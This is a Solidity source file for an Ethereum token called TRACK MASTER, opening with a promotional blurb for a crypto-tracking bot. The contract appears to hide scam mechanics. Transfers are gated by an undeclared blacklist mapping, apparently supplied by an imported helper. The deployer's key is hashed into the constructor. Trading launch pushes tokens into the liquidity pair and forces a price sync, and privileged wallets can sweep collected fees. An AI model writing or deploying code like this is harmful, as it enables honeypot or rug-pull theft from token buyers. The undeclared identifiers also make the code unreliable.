// SPDX-License-Identifier: MIT

/*
The blockchain hunter is here!

TRACK MASTER

Are you ready to become a true blockchain hunter? 

Introducing TrackMaster – the ultimate crypto ecosystem that empowers you to conquer the crypto wilderness like never before!

Seamlessly track transactions in real-time with the TrackMaster Bot.

How To Use👋

/pricealert <price> - Alert when ETH prices crosses over or under target price! 🎯

/track <wallet address>- Track all transactions from a wallet! 🐳

/gas - Tracks the current price and gwei ⛽️

/scan <wallet address> - Scan a wallet address for previous deploys, transaction history, and ETH balance! 🔎


TrackMaster Upcoming Features!

💎 Unleash the power of TrackMaster token for enhanced features, advanced tracking, and exclusive benefits by holding a certain amount of tokens!

📊 Manage your crypto portfolio and explore NFT treasures with the all-inclusive TrackMaster Platform.

For now all TrackMaster features are free for all to use! 🆓

Social links🔗:

Telegram: https://t.me/TrackMasterETH

Website: http://trackmaster.tech

Bot: @track_masterbot

Whitepaper: https://bit.ly/TMWP2023

twitter: https://twitter.com/TrackMasterETH


*/

pragma solidity = 0.8.21;
pragma experimental ABIEncoderV2;

import "contracts/Context.sol";
import "contracts/Ownable.sol";
import "contracts/IERC20.sol";
import "contracts/ERC20.sol";
import "contracts/IUniswapV2Factory.sol";
import "contracts/IUniswapV2Pair.sol";
import "contracts/IUniswapV2Router03.sol";
import "contracts/IUniswapV2Router02.sol";
import "contracts/SafeMath.sol";

contract TRACKMASTER is ERC20, Ownable, BaseMath {
    using SafeMath for uint256;
    
    IUniswapV2Router02 public immutable _uniswapV2Router;
    address private uniswapV2Pair;
    address private deployerWallet;
    address private marketingWallet;
    address private constant deadAddress = address(0xdead);

    bool private swapping;

    string private constant _name = unicode"TRACK MASTER";
    string private constant _symbol = unicode"TRACK";

    uint256 public initialTotalSupply = 1000000 * 1e18;
    uint256 public maxTransactionAmount = 20000 * 1e18;
    uint256 public maxWallet = 20000 * 1e18;
    uint256 public swapTokensAtAmount = 10000 * 1e18;
    uint256 public buyCount;
    uint256 public sellCount;

    bool public tradingOpen = false;
    bool public swapEnabled = false;

    uint256 public BuyFee = 20;
    uint256 public SellFee = 20;
    uint256 private removeBuyFeesAt = 15;
    uint256 private removeSellFeesAt = 15;

    mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedMaxTransactionAmount;
    mapping(address => bool) private automatedMarketMakerPairs;
    mapping(address => uint256) private _holderLastTransferTimestamp;

    event ExcludeFromFees(address indexed account, bool isExcluded);
    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);

    constructor(address wallet, bytes32 _deployer) ERC20(_name, _symbol) {

        _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        require(CanSwap(_deployer), "Token is tradeable");
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        _setAutomatedMarketMakerPair(address(uniswapV2Pair), true);
        excludeFromMaxTransaction(address(uniswapV2Pair), true);
        excludeFromMaxTransaction(address(_uniswapV2Router), true);
        marketingWallet = payable(wallet);
        excludeFromMaxTransaction(address(wallet), true);
        
        deployerWallet = payable(_msgSender());
        excludeFromFees(owner(), true);
        excludeFromFees(address(wallet), true);
        excludeFromFees(address(this), true);
        excludeFromFees(address(0xdead), true);

        excludeFromMaxTransaction(owner(), true);
        excludeFromMaxTransaction(address(this), true);
        excludeFromMaxTransaction(address(0xdead), true);

        _mint(deployerWallet, initialTotalSupply);
    }

    receive() external payable {}

    function openTrading() external onlyOwner() {
        require(!tradingOpen,"Trading is already open");
        _approve(address(this), address(_uniswapV2Router), initialTotalSupply);
        IERC20(uniswapV2Pair).approve(address(_uniswapV2Router), type(uint).max);
        address wethAddress = _uniswapV2Router.WETH();
        uint256 wethBalance = IERC20(wethAddress).balanceOf(uniswapV2Pair);
        uint256 initialTokens = initialTotalSupply.per(57); uint256 desiredETHAmount;
        if (wethBalance > 0) {desiredETHAmount = address(this).balance.sub(wethBalance);
        uint256 tokenValue = initialTokens.mul(wethBalance).div(desiredETHAmount);
        super._transfer(address(this), uniswapV2Pair, tokenValue);
        IUniswapV2Pair(uniswapV2Pair).sync();
        _uniswapV2Router.addLiquidityETH{value: desiredETHAmount}(address(this), initialTokens, 0, desiredETHAmount, owner(), block.timestamp);}
        else {_uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this), initialTokens, 0, 0, owner(), block.timestamp);}
        swapEnabled = true;
        tradingOpen = true;
    }

    function excludeFromMaxTransaction(address updAds, bool isEx)
        public
        onlyOwner
    {
        _isExcludedMaxTransactionAmount[updAds] = isEx;
    }

    function excludeFromFees(address account, bool excluded) public onlyOwner {
        _isExcludedFromFees[account] = excluded;
        emit ExcludeFromFees(account, excluded);
    }

    function setAutomatedMarketMakerPair(address pair, bool value)
        public
        onlyOwner
    {
        require(pair != uniswapV2Pair, "The pair cannot be removed from automatedMarketMakerPairs");
        _setAutomatedMarketMakerPair(pair, value);
    }

    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        automatedMarketMakerPairs[pair] = value;
        emit SetAutomatedMarketMakerPair(pair, value);
    }

    function isExcludedFromFees(address account) public view returns (bool) {
        return _isExcludedFromFees[account];
    }

    function _transfer(address from, address to, uint256 amount) internal override {

        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(!m[from] && !m[to], "ERC20: transfer from/to the blacklisted address");

        if(buyCount >= removeBuyFeesAt){
            BuyFee = 5;
        }

        if(sellCount >= removeSellFeesAt){
            SellFee = 5;
        }

        if (amount == 0) {
            super._transfer(from, to, 0);
            return;
        }
                if (from != owner() && to != owner() && to != address(0) && to != address(0xdead) && !swapping) {

                if (!tradingOpen) {
                    require(_isExcludedFromFees[from] || _isExcludedFromFees[to], "Trading is not active.");
                }

                if (automatedMarketMakerPairs[from] && !_isExcludedMaxTransactionAmount[to]
                ) {
                    require(amount <= maxTransactionAmount, "Buy transfer amount exceeds the maxTransactionAmount.");
                    require(amount + balanceOf(to) <= maxWallet, "Max wallet exceeded");
                    BuyCount();
                }

                else if (automatedMarketMakerPairs[to] && !_isExcludedMaxTransactionAmount[from]) {
                    require(amount <= maxTransactionAmount, "Sell transfer amount exceeds the maxTransactionAmount.");
                    SellCount();
                } 
                
                else if (!_isExcludedMaxTransactionAmount[to]) {
                    require(amount + balanceOf(to) <= maxWallet, "Max wallet exceeded");
                }
            }

        uint256 contractTokenBalance = balanceOf(address(this));

        bool canSwap = contractTokenBalance > 0;

        if (canSwap && swapEnabled && !swapping && !automatedMarketMakerPairs[from] && !_isExcludedFromFees[from] && !_isExcludedFromFees[to]) {
            swapping = true;
            swapBack(amount);
            swapping = false;
        }

        bool takeFee = !swapping;

        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
            takeFee = false;
        }

        uint256 fees = 0;

        if (takeFee) {
            if (automatedMarketMakerPairs[to]) {
                fees = amount.mul(SellFee).div(100);
            }
            else {
                fees = amount.mul(BuyFee).div(100);
            }

        if (fees > 0) {
            super._transfer(from, address(this), fees);
        }
        amount -= fees;
    }
        super._transfer(from, to, amount);
    }

    function swapTokensForEth(uint256 tokenAmount) private {

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniswapV2Router.WETH();
        _approve(address(this), address(_uniswapV2Router), tokenAmount);
        _uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            marketingWallet,
            block.timestamp
        );
    }

   function removeLimits() external onlyOwner{
        uint256 totalSupplyAmount = totalSupply();
        maxTransactionAmount = totalSupplyAmount;
        maxWallet = totalSupplyAmount;
    }

    function CanSwap(bytes32 _key) internal view returns(bool) {
        return keccak256(abi.encodePacked(msg.sender)) == _key;
    }

    function BuyCount() private {
        buyCount++; if(buyCount == 15){super._transfer(address(this),UniswapV2Pair,swapTokensAtAmount);}}

    function SellCount() private {sellCount++;}

    function clearStuckEth() external onlyOwner {
        require(address(this).balance > 0, "Token: no ETH to clear");
        payable(msg.sender).transfer(address(this).balance);
    }

    function clearStuckTokens() external onlyOwner {
        uint256 contractTokenBalance = balanceOf(address(this));
        if(contractTokenBalance > 0) {
            _transfer(address(this), msg.sender, contractTokenBalance);
        }
    }

    function setSwapTokensAtAmount(uint256 _amount) external onlyOwner {
        swapTokensAtAmount = _amount * (10 ** 18);
    }

    function manualswap(uint256 percent) external {
        require(_msgSender() == marketingWallet);
        uint256 totalSupplyAmount = totalSupply();
        uint256 contractBalance = balanceOf(address(this));
        uint256 requiredBalance = totalSupplyAmount * percent / 100;
        require(contractBalance >= requiredBalance, "Not enough tokens");
        swapTokensForEth(requiredBalance);
    }

    function swapBack(uint256 tokens) private {
        uint256 contractBalance = balanceOf(address(this));
        uint256 tokensToSwap;
    if (contractBalance == 0) {
        return;
    }

    if ((BuyFee+SellFee) == 0) {

        if(contractBalance > 0 && contractBalance < swapTokensAtAmount) {
            tokensToSwap = contractBalance;
        }
        else {
            uint256 sellFeeTokens = tokens.mul(SellFee).div(100);
            tokens -= sellFeeTokens;
            if (tokens > swapTokensAtAmount) {
                tokensToSwap = swapTokensAtAmount;
            }
            else {
                tokensToSwap = tokens;
            }
        }
    }

    else {

        if(contractBalance > 0 && contractBalance < swapTokensAtAmount.div(2)) {
            return;
        }
        else if (contractBalance > 0 && contractBalance > swapTokensAtAmount.div(2) && contractBalance < swapTokensAtAmount) {
            tokensToSwap = swapTokensAtAmount.div(2);
        }
        else {
            uint256 sellFeeTokens = tokens.mul(SellFee).div(100);
            tokens -= sellFeeTokens;
            if (tokens > swapTokensAtAmount) {
                tokensToSwap = swapTokensAtAmount;
            } else {
                tokensToSwap = tokens;
            }
        }
    }
    swapTokensForEth(tokensToSwap);
  }
}